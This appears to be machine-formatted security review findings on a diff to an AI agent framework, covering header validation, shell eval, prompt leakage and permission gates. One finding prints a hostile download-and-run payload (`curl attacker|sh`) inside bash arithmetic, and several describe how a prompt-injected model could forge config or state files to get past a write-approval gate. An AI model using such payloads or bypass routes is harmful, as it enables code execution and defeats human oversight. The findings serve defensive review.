findings.cross_file_justification: The schema hunk in the diff introduces a catalog-sourced list that anthropic_adapter._beta_header_value (not in the diff) joins into the outgoing `anthropic-beta` HTTP header. The schema description names the adapter's `_BETA_HEADER_RE` as the runtime gate but that regex is not shown; the catalog hunk adds `beta_headers: []` to the new claude-opus-5-5 entry, making the runtime regex the sole gate for any operator overlay.
findings.description: Catalog values now flow into an outbound HTTP header. The JSON-schema pattern is strict under ECMA semantics (`$` is end-of-string, `[0-9]` is ASCII), but the schema is only enforced where it is validated, and the description says the adapter's own regex is the dispatch-time gate. In Python `re`, `^...$` with `re.match` accepts a trailing newline and `\d` accepts non-ASCII digits, so a value such as `context-1m-2025-08-07\n` or a flag with Unicode digits could pass the adapter check while failing the schema. Threat is bounded: the catalog is operator-controlled and the same file already carries the endpoint and API key, and httpx/h11 reject CR/LF in header values, so a crafted value produces a transport error rather than a smuggled header. This is a defense-in-depth gap, not an exploitable vulnerability.
findings.failure_mode: An operator overlay or edited catalog supplies a beta flag with a trailing newline or non-ASCII digits; it passes the runtime regex and the request fails at header construction (or, under a transport that does not validate header bytes, injects a header).
findings.suggested_fix: In anthropic_adapter, validate with `re.fullmatch` using an explicit `[0-9]` class (no `\d`, no `$`), additionally reject any value containing characters outside `[a-z0-9-]`, and run the merged catalog through the v3 schema at load time so the schema pattern is enforced where operator overlays are applied, not only in CI.

findings.description: The new `opus` alias target declares `probed_ceiling: 180000` while the adjacent comment states the value is Opus 5's measured bound and was not probed on 5.5, and `ceiling_calibration.source` is `conservative_default`. The schema added in the same diff defines `probed_ceiling` as "the last measured input bound the catalog ships" and says `routing/ceiling.input_bound` uses it for uncalibrated entries under the default `probed` policy. The default high-quality tier's input gate therefore rests on a value labelled as measured but copied from a different model. Compounding this, `test_every_http_entry_carries_the_probed_bound_and_account_limits` asserts `probed_ceiling == CEILING_CAP` for every HTTP entry, so CI cannot detect a wrong per-model value and will reject a genuine probe result that measures anything other than 180000.
findings.failure_mode: If Opus 5.5's real input bound is lower, prompts up to 180K tokens are admitted by the gate and rejected or truncated by the vendor, degrading the default tier under load; if higher, capacity is left unused. Recording a real probe result breaks the test suite.
findings.suggested_fix: Omit `probed_ceiling` on claude-opus-5-5 until tools/ceiling-probe-live.py has run on it (letting input_bound fall through to the I1 derivation), or add an explicit provenance marker alongside it. Change the floor test to assert `probed_ceiling <= CEILING_CAP` and consistency with `effective_input_ceiling` rather than equality to the constant.

findings.cross_file_justification: The new T13 tests are the only oracle for GENERATED_MODEL_ALIASES, a block of TypeScript string literals that the (not-in-diff) gen-bb-registry-codegen script emits from catalog alias keys/targets into truncation.generated.ts, which is compiled into BB. The oracle is built with a raw printf '%s' and no escaping, so it mirrors an unescaped emit instead of detecting one.
findings.description: T13 derives its expectation with printf '  "%s": "%s",' on alias names and model ids taken straight from the YAML, and compares that to the generator's output. If the generator also emits identifiers unescaped, an alias key or target containing a double quote, backslash, or newline produces the same malformed TypeScript on both sides and the test passes. The fixture test shows the generator accepts an arbitrary --source-yaml path, so the input is not limited to the committed catalog. The same helper and _expected_max_output also build yq expressions by splicing $provider/$model inside \"...\" quotes, which breaks or changes meaning on a quote in the value.
findings.failure_mode: A hostile or malformed alias entry in model-config.yaml or a --source-yaml override is emitted verbatim into truncation.generated.ts, yielding a broken build or injected code in BB's compiled registry, with no test coverage because the oracle reproduces the same unescaped output.
findings.suggested_fix: In the test, assert every alias key and target matches a strict identifier pattern (e.g. ^[A-Za-z0-9._:-]+$) before building the oracle, and add a fixture with a key such as bad"key asserting the generator exits non-zero (as it does for invalid context_window, status 78) rather than emitting it. In the generator, JSON.stringify each emitted identifier. Pass provider/model to yq via env() or --arg instead of string interpolation.

findings.anchor: V3 (c126): every beta-header value the schema accepts, the adapter accepts (never looser)
findings.trigger_anchor: tests/unit/model-config-v3-schema.bats:V3 (c126): every beta-header value the schema accepts, the adapter accepts (never looser)
findings.cross_file_justification: params.beta_headers values flow from model-config.yaml through anthropic_adapter._BETA_HEADER_RE (not in diff) into the outbound anthropic-beta HTTP header. This new test is the only place in the change that exercises that allowlist, and it only checks one direction.
findings.description: The test asserts schema-accepted ⊆ adapter-accepted, so it guarantees usability (valid config is not rejected at runtime) but never asserts the adapter rejects anything, even though the adapter is the last check before the header sink. It also evaluates the JSON-Schema (ECMA-262) pattern with Python re.search, where \d is Unicode-aware and $ matches before a trailing newline, and the case list has no CR, LF, or trailing-newline inputs. A _BETA_HEADER_RE that ends in $ and is used with .match() would accept "context-1m-2025-08-07\n" and this test would not notice.
findings.failure_mode: An adapter allowlist looser than the schema (trailing newline, Unicode digits, missing end anchor) ships undetected; any config value that bypasses or predates schema validation reaches the anthropic-beta header, causing request failures from header-encoding checks or, with a permissive HTTP client, header injection.
findings.suggested_fix: Add the converse assertion (every schema-rejected case is also rejected by _BETA_HEADER_RE) and extend cases with "context-1m-2025-08-07\n", "context-1m-2025-08-07\r\nX: y", and "context-1m-2025-08-07 ". Use re.fullmatch with re.ASCII (or \A...\Z anchors) in the adapter, and assert the schema pattern uses [0-9] and ^...$ so Python and ECMA semantics agree.

findings.title: Headless Claude CLI is classified as a side-effect-free remote model
findings.description: The new `anthropic:claude-headless` row grants `trust_level: high` while declaring `execution_mode: remote_model` and all tool capabilities false. The notes admit this path is actually a local `claude -p` CLI hop whose tools can be widened through `extra.allowed_tools`. If enforcement or routing trusts this registry row, a locally executable CLI adapter can be treated as a no-side-effect remote oracle, bypassing capability/trust checks when operator config enables tools. This is exploitable as an authorization boundary confusion between remote inference and local tool-capable execution.
findings.recommendation: Do not model `anthropic:claude-headless` as `remote_model` with false capabilities unless the adapter hard-enforces empty tools and plan mode independent of user config. Either remove this row from remote parity tests or classify it as a separate CLI/native execution mode with capabilities derived from the effective adapter config.
findings.failure_mode: The new `anthropic:claude-headless` row grants `trust_level: high` while declaring `execution_mode: remote_model` and all tool capabilities false.

findings.description: The new `anthropic:claude-headless` row declares a local `claude -p` subprocess (the row's own notes say `kind: cli`) as `execution_mode: remote_model` with every capability false. The notes admit the real tool surface is operator-configurable via `extra.allowed_tools`, and a Claude Code process additionally loads project-level settings (hooks, MCP servers) from its working directory, so 'pure inference, no tool loop' is a property of the adapter's current flags and cwd, not of this row. The registry is a static declaration that is neither derived from nor validated against the adapter config. The new mirror test then hard-codes `execution_mode == "remote_model"` for every served Anthropic key, so it structurally prevents this row from ever being labeled as a local CLI hop even if someone tries to correct it.
findings.failure_mode: Any governance logic that gates on `execution_mode` or `capabilities` from model-permissions.yaml (e.g., deciding to hand over `security: redacted` context, permit delegation, or skip sandboxing) treats a tool-capable local process with the operator's credentials and filesystem as a side-effect-free remote oracle. An operator who sets `extra.allowed_tools`, or a checkout whose `.claude/settings.json` / `.mcp.json` the CLI picks up, gains file/command/network access with no registry change and a green test suite.
findings.suggested_fix: Give `anthropic:claude-headless` a distinct `execution_mode` (e.g., `local_cli`) and either exclude it from the remote_model mirror assertion or assert it explicitly. In the headless adapter, fail closed when `extra.allowed_tools` is non-empty while the registry row's capabilities are all false, and invoke the CLI with `--strict-mcp-config` and an isolated settings directory so repo-controlled hooks or MCP config cannot widen the tool surface. Add a test that cross-checks the adapter's declared tool flags against this row.

findings.description: The mirror test compares every served row to the live `anthropic:claude-opus-4-7` row rather than to literal expected values. The only literal pins in the suite are the six operational dimensions == "none" (`test_anthropic_opus_4_7_all_none`). The reference row's `capabilities` (file_read/file_write/command_execution/network_access) and `context_access.security: redacted` are asserted only by parity with 4-6, which is itself never pinned. The in-test comment claims 'a widened scope on any served row fails here', but that is true only for single-row drift.
findings.failure_mode: A change flipping `command_execution: true` or `security: full` on 4-6 and 4-7 propagates to all 16+ mirrored rows with the entire suite passing; the registry's most consequential fields have no literal guard.
findings.suggested_fix: Pin the reference literally: assert every capability is False and `context_access.security == "redacted"` for `anthropic:claude-opus-4-7` (or for every row with `execution_mode: remote_model`), then keep the parity check for structural drift.

findings.description: The coverage check enumerates only `providers.anthropic.models` plus Bedrock IDs containing the substring `anthropic.`. Every other provider the catalog serves (openai, google, moonshot, qwen-local, non-Anthropic Bedrock) is not checked for a registry row, so the 'no current model is unscoped' guarantee the docstring claims applies to one vendor only.
findings.failure_mode: A new catalog entry for another provider can be routed to with no trust boundary defined; whatever the runtime does on a missing row (default-allow or crash) is untested and invisible to CI.
findings.suggested_fix: Generalize the helper to iterate every provider in model-config.yaml and assert a `provider:model` row exists for each, with an explicit allowlist for any entries intentionally left unregistered.

findings.title: Existing EXIT trap body is re-evaluated while composing the new trap
findings.description: The new trap chains `prev_exit_body` by expanding it directly into a `trap` command. If `model-adapter.sh` is called from a shell context that already has an attacker-influenced EXIT trap, the previous handler text is parsed as shell syntax during this assignment path. The code also restores the original trap with `eval "$prev_exit_trap"`. This turns inherited trap state into executable input, which is especially risky for a model adapter that handles prompts and credentials.
findings.recommendation: Do not parse or concatenate trap source text. Use a cleanup helper function and avoid preserving arbitrary prior traps, or store cleanup in a trap stack implemented with function names controlled by this script. If chaining is required, restrict it to known-safe function identifiers rather than raw trap bodies.
findings.failure_mode: The new trap chains `prev_exit_body` by expanding it directly into a `trap` command.
findings.demotion_reason: Demoted: anchor not in diff scope

findings.cross_file_justification: .claude/scripts/flatline-validate-learning.sh is the sibling script generated from the same template; this diff applies the identical GPT_MODEL/OPUS_MODEL alias change to it, so it almost certainly contains the same `jq -r '.score'` -> `[[ -lt ]]` sink and should be checked at the same time (full file not provided).
findings.description: In .claude/scripts/flatline-proposal-review.sh (diff-touched: model defaults changed to the `reviewer`/`opus` catalog aliases), review_proposal() takes the model's JSON reply, extracts `.score` with `jq -r` (no type check), and then evaluates `[[ "$gpt_score" -lt "$MIN_ALIGNMENT" ]]` and `[[ "$opus_score" -lt ... ]]`. Inside `[[ ]]`, the operands of -lt undergo bash arithmetic evaluation, so a string such as `a[$(curl attacker|sh)]` executes the embedded command. The attacker path is: untrusted learning text (trigger/solution) -> build_review_prompt -> reviewer model -> reply. The reply is parsed with `grep -o '{[^}]*}' | head -1`, which takes the FIRST brace block anywhere in the output, so a learning that embeds `{"score":"a[$(...)]"}` only needs the model to quote or restate the learning before giving its verdict. The guards do not hold: validate_proposal_review_response failing only triggers log_warning and does not return; the preceding `bc` average computation reports a syntax error to stderr and exits 0, so set -e does not abort before the `[[ -lt ]]` test runs. isolate_content wrapping reduces but does not eliminate prompt-injection likelihood. The sink lines are pre-existing, but the file is in this diff and the change alters which model (and routing path) produces the attacker-influenced output.
findings.failure_mode: Arbitrary command execution in the shell of whoever runs the proposal review (operator session or CI), triggered by a crafted learning that survives or steers the reviewer model's output.
findings.suggested_fix: Before any arithmetic, validate both scores strictly: `[[ "$gpt_score" =~ ^[0-9]{1,4}$ ]] && (( gpt_score <= 1000 )) || return 4`, or extract with `jq -e '.score | select(type=="number") | floor'`. Make schema-validation failure fatal (return 4) instead of a warning. Replace `grep -o '{[^}]*}' | head -1` with a proper JSON parse (e.g. `jq -c 'select(type=="object")'` on the whole reply or a fenced-block extractor) so attacker-supplied brace blocks in echoed content are not selected. Apply the same fix to flatline-validate-learning.sh.
findings.demotion_reason: Demoted: anchor not in diff scope

findings.description: In .claude/scripts/model-adapter.sh main(), cheval/model-invoke stderr is now written to disk under ${TMPDIR:-/tmp} instead of being discarded. That stream can contain prompt text, provider error bodies, and (under LOA_DEBUG / verbose cheval modes) request metadata. mktemp's 0600 mode is the only protection; the subsequent `2>"$err_file"` re-opens by path (no O_NOFOLLOW), so safety also depends on TMPDIR being sticky or private. A SIGKILL between the redirect and `rm -f` leaves the file behind, since the EXIT trap does not run on SIGKILL. The relayed WARN line is truncated with `cut -c1-600` but not sanitised, so terminal control sequences in that stderr line would pass through to the operator's terminal.
findings.failure_mode: Residual temp files containing prompt/debug content readable by a local user who gains the operator's uid or a misconfigured shared TMPDIR; low-impact terminal escape injection via the relayed stderr line.
findings.suggested_fix: Avoid the on-disk file entirely: `result=$("$MODEL_INVOKE" "${invoke_args[@]}" 2> >(grep -F -- 'gemini-headless dispatches agy' | cut -c1-600 | tr -cd '[:print:]\n' >&2))`. If a file is kept, open it once with `exec {fd}<>"$err_file"` and `rm` it immediately, then redirect with `2>&$fd`, which removes both the symlink window and the SIGKILL residue.

findings.trigger_anchor: if [[ -n "$prev_exit_trap" ]]; then eval "$prev_exit_trap"; else trap - EXIT; fi
findings.description: .claude/scripts/model-adapter.sh adds two `eval` sites: `_trap_body` runs `eval "set -- $1"` on `trap -p EXIT` output, and main() later runs `eval "$prev_exit_trap"` to restore it. Today this is safe because bash's `trap -p` emits a single-quoted, re-input-safe string and `set --` in a `$(...)` subshell only assigns positional parameters. It is still an eval of a runtime-constructed string in a script that is both executed and sourced by several orchestrators, and the pattern relies on an undocumented-looking bash guarantee (parent traps visible to `$(trap -p)`). Not exploitable as written; flagged as hardening.
findings.failure_mode: A future change that builds the EXIT trap from config or environment, or a shell that does not quote `trap -p` output identically, turns this into a code-execution path with no further review.
findings.suggested_fix: Drop the eval-based parser: use the process-substitution approach from SEC-002 so no EXIT trap manipulation is needed, or save/restore traps without eval, e.g. `prev=$(trap -p EXIT); trap 'rm -f -- "$err_file"' EXIT; ...; [[ -n $prev ]] && trap "${prev#trap -- }" || trap - EXIT` after extracting the body with a `read -r _ _ body _ <<<"$prev"`-style parse plus `printf %s` unquoting, or simply require callers not to rely on an inherited EXIT trap and document it.

findings.title: Model prompts are still dispatched through argv, exposing sensitive prompt contents to local users
findings.description: The new test explicitly preserves behavior where `gemini-headless` dispatches `agy` with the whole prompt on argv, warning that it is readable via `/proc/<pid>/cmdline` and `ps`. Prompts commonly contain secrets, proprietary code, credentials, or incident data; on a multi-user host any local account can scrape those arguments during the hop. Forwarding a warning does not mitigate the exposure.
findings.recommendation: Change the model invocation path to pass prompts through stdin or a private, permission-restricted temp file, and ensure downstream adapters never place prompt bodies in argv. Keep the warning only as a regression guard until the unsafe path is removed.
findings.failure_mode: The new test explicitly preserves behavior where `gemini-headless` dispatches `agy` with the whole prompt on argv, warning that it is readable via `/proc/<pid>/cmdline` and `ps`.

findings.anchor: @test "MA-5 (bd-pw7e LOW-001) the agy argv WARN reaches the shim's stderr; other cheval stderr stays out"
findings.cross_file_justification: The sink is cheval's gemini-headless provider, which execs `agy` with the entire prompt on argv (not in this diff). The diff-touched test file model-adapter.bats pins the behaviour of .claude/scripts/model-adapter.sh to 'relay a WARN line' and nothing more, so the tests now lock in warn-only handling of a live local-disclosure path.
findings.description: MA-5 and MA-6 assert that the only remediation for the agy argv exposure is forwarding a WARNING string to stderr. The WARN text itself states the whole prompt is readable by every local account via /proc/<pid>/cmdline and ps for the life of the hop. Flatline prompts carry source, PRDs, review payloads and whatever the operator fed in. MA-7 further accepts that when TMPDIR is unusable the relay is silently replaced by a generic 'stderr capture disabled' WARN, so even the warning is best-effort. The suite therefore treats a confirmed prompt leak on multi-user hosts as expected, tested behaviour rather than a defect to close.
findings.failure_mode: On any shared host (CI runners, dev boxes, containers with a sidecar user) a non-privileged local account polls `ps -eo args` or /proc/*/cmdline while a gemini-headless hop runs and reads the full review prompt, including any secrets or proprietary code embedded in it. The operator only sees a stderr line, and not even that if TMPDIR is broken.
findings.suggested_fix: Fix the sink rather than the message: have the gemini-headless provider hand the prompt to agy via stdin or a 0600 temp file, or refuse to dispatch gemini-headless unless an explicit opt-in (e.g. LOA_ALLOW_ARGV_PROMPT=1) is set. Keep MA-5/MA-6 but add a test asserting that, without the opt-in, the hop fails closed instead of warning. Separately confirm model-adapter.sh creates model-adapter-stderr.* with mktemp (0600), since MA-5 shows cheval stderr can contain provider chatter that is written to that file before filtering.

findings.description: The hunk labelled .claude/data/personas/alternative-model.md contains bats test code (`@test "bare gemini-3.1-pro NOT in VALID_FLATLINE_MODELS"`, `_extract_validator`, `source '$TEST_DIR/validator.sh'`). The supplied full file is a ~35 line markdown persona with no test blocks, so the hunk at lines 32 to 60 cannot apply to it. Two changes are therefore unreviewed: whatever bats file actually received this hunk, and the real edit to alternative-model.md that RES-4 in model-residue.bats implies (it asserts the file now names bedrock:us.anthropic.claude-opus-4-8 and no longer mentions claude-3-5-sonnet).
findings.failure_mode: A reviewer approving this diff signs off on a test-file change attributed to the wrong path and never sees the actual persona edit. If the mislabel comes from the diff-assembly tooling, every future review through this pipeline can hide changes the same way.
findings.suggested_fix: Regenerate the diff from git directly and confirm each hunk header matches its content. Add the real alternative-model.md hunk and the correctly attributed bats hunk before merging.

findings.description: map_of and map_value use awk to slice everything from `declare -A NAME=(` down to the first line matching `^\)` and then run that text through `bash -c`. map_value additionally splices the array name argument straight into the code string: `printf "%s" "${'"$2"'[$1]:-}"`. The awk window is not restricted to key=value lines, so any command substitution or stray statement inside or after the declare block (up to the closing paren) executes during the test run. Current callers pass literals, and the scripts are repo-owned, so this is not exploitable today.
findings.failure_mode: A future edit that adds a `$(...)` default inside MODEL_TO_ALIAS, or a caller that passes a variable as the array name, turns the test helper into an eval of arbitrary text. The pattern is also an easy copy-paste into non-test scripts where inputs are less controlled.
findings.suggested_fix: Source the target script in a subshell with a no-op main guard and read the map with `declare -p NAME`, or parse the block with a strict regex that only accepts `[key]="value"` lines. Validate the array name against `^[A-Za-z_][A-Za-z0-9_]*$` before interpolating it.

findings.title: Model-writable config can enable authoritative mode and bypass the App Zone gate
findings.description: The new mode switch trusts `$PROJECT_ROOT/.loa.config.yaml` to select `implement_gate.mode: authoritative`, but `.loa.config.yaml` is outside the App Zone and this hook allows non-App-Zone writes. A model/tool run can first write or edit `.loa.config.yaml` to set authoritative mode, then send a Write/Edit payload with `tool_input.active_skill` set to `implement`, which the same file documents as model-authored and untrusted. That reaches the allow branch at the active_skill case and exits 0 for App Zone writes, bypassing the intended review gate.
findings.recommendation: Do not let a repo-local, model-writable file enable authoritative mode. Require an out-of-band trusted source such as an environment variable set by the harness, a root-owned config outside the workspace, or a signed/permission-checked config. If `.loa.config.yaml` remains supported, treat changes to it as protected and never trust `tool_input.active_skill` for allow decisions.
findings.failure_mode: The new mode switch trusts `$PROJECT_ROOT/.loa.config.yaml` to select `implement_gate.mode: authoritative`, but `.loa.config.yaml` is outside the App Zone and this hook allows non-App-Zone writes.

findings.description: Authoritative mode treats tool_input.active_skill as proof that an implementation skill is active, but the diff's own header states tool_input is model-authored. The fixture write-src-active-implement.json and the expected.tsv row 'ask allow yes' codify that a payload carrying active_skill=implement is silently allowed in this mode. The new mode selector is .loa.config.yaml at PROJECT_ROOT. That path is not under src/, lib/, or app/, so this same hook exits 0 for a Write to it without asking. The model that the gate is meant to constrain can therefore (1) Write .loa.config.yaml with implement_gate.mode: authoritative, then (2) Write src/anything with active_skill=implement, and never trigger an ask. The only control is that the key is undocumented (IG-11), but the key name is readable in the hook source and test files in the repo.
findings.failure_mode: A prompt-injected or misbehaving model performs two Write calls and gains unprompted write access to the App Zone. The operator is never asked and the audit log records nothing because the authoritative allow path exits 0 silently. The gate's stated purpose (catching App Zone writes outside /implement or /bug) is fully defeated by self-attestation.
findings.suggested_fix: Do not allow model-authored tool_input to select the allow path. If the authoritative branch must exist, require a harness-set field (none exists today) or remove the branch until one does. If the config opt-in stays, treat .loa.config.yaml as a protected path in this hook (ask on any Write/Edit to it) and have the authoritative branch only ever downgrade to ask, never upgrade to allow, on a model-supplied skill name.
findings.demotion_reason: Demoted: anchor not in diff scope

findings.description: The diff makes heuristic mode the default for every installation. Heuristic mode allows App Zone writes when .run/sprint-plan-state.json has state RUNNING, a non-empty plan_id, and a last_activity under 24h, or when .run/simstim-state.json has phase implementation, or .run/state.json has state RUNNING. All of these files live under .run/, which is not an App Zone path, so this hook exits 0 on a Write to any of them. The integrity checks (plan_id present, fresh timestamp) are trivially satisfiable by the forger. The header claims ATK-005 (state tampering) is addressed, but IG-5 only verifies that .run/ cannot select the authoritative mode, not that .run/ cannot produce an allow.
findings.failure_mode: A model writes a one-line sprint-plan-state.json with state RUNNING, a plan_id, and the current UTC timestamp, then writes freely to src/, lib/, or app/ with no ask and no audit entry.
findings.suggested_fix: Treat .run/ state files as protected paths in this hook (ask on direct Write/Edit to them), or bind RUNNING state to something the model cannot author, such as an HMAC over the state keyed from a file outside the model's write scope, or a marker created only by the skill runner process.

findings.anchor: echo '{"decision":"ask","reason":"[ADVISORY] App Zone write outside active implementation. Verify this is intentional."}'
findings.cross_file_justification: tests/unit/implement-gate.bats and tests/unit/compliance-hook.bats (both diff-touched) assert only on the literal string in stdout, so they would pass even if the harness ignores this field.
findings.description: The hook signals its block by emitting a top-level decision field with value ask. In the Claude Code PreToolUse hook schema, the top-level decision field is the legacy form and accepts approve or block; the value ask is only defined under hookSpecificOutput.permissionDecision. If the harness does not recognize decision=ask it falls back to normal permission flow, which in auto-accept modes means the write proceeds. The header promises FAIL-ASK, not fail-open, and the diff's new tests cement this output format without exercising the harness. This is pre-existing but the diff standardizes the test suite around it.
findings.failure_mode: Every ask path in the gate, including the advisory and authoritative asks, becomes a silent allow in environments where the legacy decision field does not accept ask. The compliance gate provides no protection while tests report green.
findings.suggested_fix: Emit the current schema: {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"..."}}. Optionally also emit the legacy field. Add a test that validates the output against the documented hook schema rather than a substring match.

findings.anchor: echo "[AUTHORITATIVE] App Zone write to '$file_path' detected during /$active_skill (not an implementation skill)." >&2
findings.description: Both file_path and active_skill come from model-authored tool_input and are interpolated into stderr without sanitization. active_skill can contain newlines, ANSI escape sequences, or instruction-like text. The authoritative branch that prints active_skill is newly reachable via the config opt-in. The header lists ATK-007 (prompt injection via file path) as addressed, but no filtering is applied to either value in this message or the ADVISORY message.
findings.failure_mode: Hook stderr is surfaced to the operator and may be fed back to the model. A crafted active_skill or file_path value can spoof additional log lines, hide the warning with terminal escapes, or inject instructions into the transcript.
findings.suggested_fix: Strip control characters and truncate both values before echoing (for example, printf '%q' or tr -d '\000-\037\177'), or omit the model-supplied skill name from the message and log it only as a jq-escaped JSON field in audit.jsonl.

findings.cross_file_justification: IG-10 in tests/unit/implement-gate.bats shows detect-platform-features.sh renders this evidence in the /loa status line that operators read.
findings.description: The evidence recorder fires on any payload carrying tool_input.active_skill, before the file_path or App Zone check, and writes active_skill_seen_at into .run/platform-features.json. The trigger is model-authored. The written values are fixed strings so there is no injection, but the resulting status line reads 'active_skill evidence: seen <ts> via tool_input'. An operator who sees that line may conclude the harness supports the field and opt into authoritative mode, which is the weaker mode per IG-SEC-1. The recorder also runs with no path restriction, so a Bash or other tool payload with a stray active_skill key would record evidence too, depending on the hook matcher.
findings.failure_mode: A model can manufacture evidence that nudges an operator toward enabling the self-attesting authoritative mode. Low direct impact, but it is a social-engineering step toward the HIGH finding.
findings.suggested_fix: Gate the recorder on tool_name being Write or Edit and on the payload passing the App Zone check, or drop the recorder entirely since the diff already concludes the field is never harness-set. If kept, make the status line state plainly that the evidence is model-supplied and must not be used to justify the opt-in.

findings.cross_file_justification: detect-platform-features.sh (diff-touched) reads implement_gate.mode from the project-local .loa.config.yaml and labels the gate 'authoritative'. The same flag is consumed by implement-gate.sh (not in this diff), which the header comment says records active_skill evidence from tool_input. The diff explicitly states tool_input is model-authored and that no harness-set skill field exists in the PreToolUse payload.
findings.description: The new --line mode advertises the implement gate as 'authoritative' purely because a project-local YAML flag is set. By the diff's own account, the only skill signal available to the gate is tool_input.active_skill, which the model writes. An 'authoritative' mode backed by model-authored input means the subject of the control (the model) can satisfy the control by asserting it is inside /implement. The status line does append 'no harness skill signal', so the display is honest, but the mode itself remains selectable and is surfaced as a legitimate operating state.
findings.failure_mode: With implement_gate.mode: authoritative in .loa.config.yaml, a model (or a prompt-injected model) that sets active_skill in its tool_input passes the C-PROC-001 write gate outside /implement. The /loa status line will report the gate as authoritative, giving operators false confidence that a stronger control is in force.
findings.suggested_fix: Until a harness-set signal exists, have detect-platform-features.sh --line (and implement-gate.sh) treat 'authoritative' as unsupported: print a WARN that the mode is ignored and fall back to heuristic, rather than labeling it as active. Alternatively gate the mode on harness_signal: true in platform-features.json, which this script now always writes as false.

findings.anchor: evidence=$(jq -r 'if (.active_skill_seen_at // "") != "" then "seen \(.active_skill_seen_at) via \(.active_skill_source // "unknown")" else empty end'
findings.description: The --line output echoes active_skill_seen_at and active_skill_source from .run/platform-features.json into the operator's terminal via loa-status.sh. The .run/ directory is writable by the model through normal file tools, and the refresh path carries these two keys forward verbatim on every run with no type, format, or freshness check. Sanitization strips [:cntrl:] bytes and truncates to 120 characters, which neutralizes ANSI escapes, but multibyte Unicode format characters (bidi overrides U+202E/U+2066, zero-width joiners) are not control bytes and pass through tr -d unchanged.
findings.failure_mode: A model or injected content writes a crafted active_skill_source into .run/platform-features.json. Every subsequent refresh preserves it, and /loa renders a status line whose visible text can be reordered or hidden with bidi characters, or that asserts stale 'seen <timestamp> via <source>' evidence indefinitely.
findings.suggested_fix: In the refresh path, validate active_skill_seen_at against the ISO-8601 shape and active_skill_source against a known enum (or at least require both to be strings) before carrying them forward, and drop evidence older than a bounded window. In --line, restrict evidence to printable ASCII (e.g. tr -cd '[:print:]' or a [A-Za-z0-9:_./ -] allowlist) rather than only deleting control bytes.

findings.description: The new grammar consults only three keys per requirement: ALL, the requirement's exact normalized key, and its first word. Claude Code's prefix semantics are broader: a deny Bash(git pu:*) or Bash(rm -r:*) denies the commands Run Mode will actually execute but matches neither 'git push' nor 'git', so the checker reports PASSED. Inner-whitespace variants (Bash(git  push:*)) are likewise invisible. Separately, rules are read with jq -r and split on newlines, so a single JSON string containing an embedded newline is parsed as two rules, the first of which may satisfy a requirement that Claude Code would never match. The script is advisory and Claude Code enforces its own rules, so this is not a bypass, but the preflight exists specifically to prevent unattended runs from stalling on a prompt.
findings.failure_mode: Operator has a legitimate narrow deny such as Bash(rm -rf:*) or Bash(git pu:*); check-permissions.sh prints 'Run Mode pre-flight check: PASSED'; the autonomous run later hits a permission prompt or denial and hangs unattended.
findings.suggested_fix: When checking denies, iterate every stored wildcard deny key and test whether it is a prefix of the requirement's key (string-prefix, honoring the documented ':*' semantics), rather than only the exact key and first word. Collapse internal runs of whitespace during normalization. Use jq -r '... | @json' or 'select(test("\n") | not)' so a rule string with embedded newlines is skipped with a WARN rather than split.

findings.cross_file_justification: agent-types.yaml (new in this diff) is the sole source for WRITE_CAPABLE_AGENTS, and the only consumer is validate-skill-capabilities.sh, whose diff body is truncated in the provided changes.
findings.description: The diff hunk for validate-skill-capabilities.sh is empty, so the parser that loads agent-types.yaml and the documented fail-closed fallback ('general-purpose alone when the file is missing, unparsable, or lists no write_capable: true entry') could not be verified. The YAML header comment itself contains the literal substring 'write_capable: true', which a grep -B1 or awk-style parser would match and attach to the preceding comment line as an agent name. The lint is a functional invariant rather than a privilege boundary (widening it only causes skills to silently fail writes at runtime), so impact is limited, but the fallback claim in skill-invariants.md is unverified.
findings.failure_mode: If parsing is line-based, comments or future edits pollute the allowlist with garbage names; if yq is absent and the fallback is not implemented as documented, the lint either aborts the validation suite or accepts every agent type, letting the Issue #553 regression (skills that refuse to persist output) reappear undetected.
findings.suggested_fix: Parse with yq -r '.agent_types | to_entries[] | select(.value.write_capable == true) | .key' and treat yq-missing, non-zero exit, or empty output as the general-purpose-only fallback with a WARN. Add a bats case that feeds a YAML whose only 'write_capable: true' appears in a comment and asserts the fallback list.

findings.title: Validator trusts AGENT_TYPES_FILE environment override for write-capable agent policy
findings.description: The write-capable agent allowlist is loaded from AGENT_TYPES_FILE when that environment variable is set. If this validator is used as a security gate for SKILL.md capabilities, an attacker who can influence the execution environment can point AGENT_TYPES_FILE at a crafted YAML file marking a read-only agent type as write_capable: true, causing the validator to accept a skill that should be rejected. That bypasses the intended authorization invariant tying write_files capability to approved write-capable agents.
findings.evidence: The changed code uses AGENT_TYPES_FILE="${AGENT_TYPES_FILE:-$PROJECT_ROOT/.claude/data/agent-types.yaml}" and then trusts yq output from that file to populate WRITE_CAPABLE_AGENTS. The new SC-T-AGENT-8 test demonstrates the override can make Plan pass and general-purpose fail.
findings.recommendation: Do not honor AGENT_TYPES_FILE in production validation paths, or restrict it to explicit test mode. Prefer reading only $PROJECT_ROOT/.claude/data/agent-types.yaml after resolving it within the repository, and fail closed on unreadable or unparsable policy files rather than accepting environment-supplied policy.
findings.failure_mode: The write-capable agent allowlist is loaded from AGENT_TYPES_FILE when that environment variable is set.

findings.description: The write-capable agent allowlist that backs the Issue #553 skill invariant is now read from a path taken verbatim from the environment, and the yq read discards stderr and masks failure with '|| true'. Any caller environment can redirect the validator to an arbitrary YAML file without touching a tracked, reviewer-visible file. Separately, a missing yq binary, a yq variant without the 'eval' subcommand (the Python yq), a null or misspelled 'agent_types' key, or a malformed data file all collapse the list to general-purpose with no diagnostic. The fallback is fail-closed, so no privilege is gained, but skills pinned to 'claude' or 'fork' then fail with an error that lists only '(general-purpose)', which pushes authors to drop 'write_files: true' or re-pin to general-purpose instead of fixing the environment, eroding the capability metadata the invariant exists to keep honest. Note also that the diff header labels this hunk as a new file at .claude/data/agent-types.yaml with /dev/null as the old side, yet its content is shell from the validator script; the real path of the changed script should be confirmed before merge so the anchor is stable.
findings.failure_mode: Misconfiguration or missing tooling silently changes validator results and produces misleading errors; the environment override lets the reviewed allowlist be replaced without a tracked-file change.
findings.suggested_fix: Emit a warning or fail when the data file exists but yields zero write_capable entries, and when yq is absent or does not support 'eval'. Honor AGENT_TYPES_FILE only when a test-harness variable is set, or require it to resolve under PROJECT_ROOT. Fix the commit so the validator change is attributed to the correct script path.

findings.anchor: A wildcard rule covers a requirement when its key equals the requirement's key or the requirement's first word; deny precedence is unchanged.
findings.trigger_anchor: @test "CP-13 table: mixed forms across layers, whitespace and escaping, and a dangerous-shape deny fuzz set behave per the grammar"
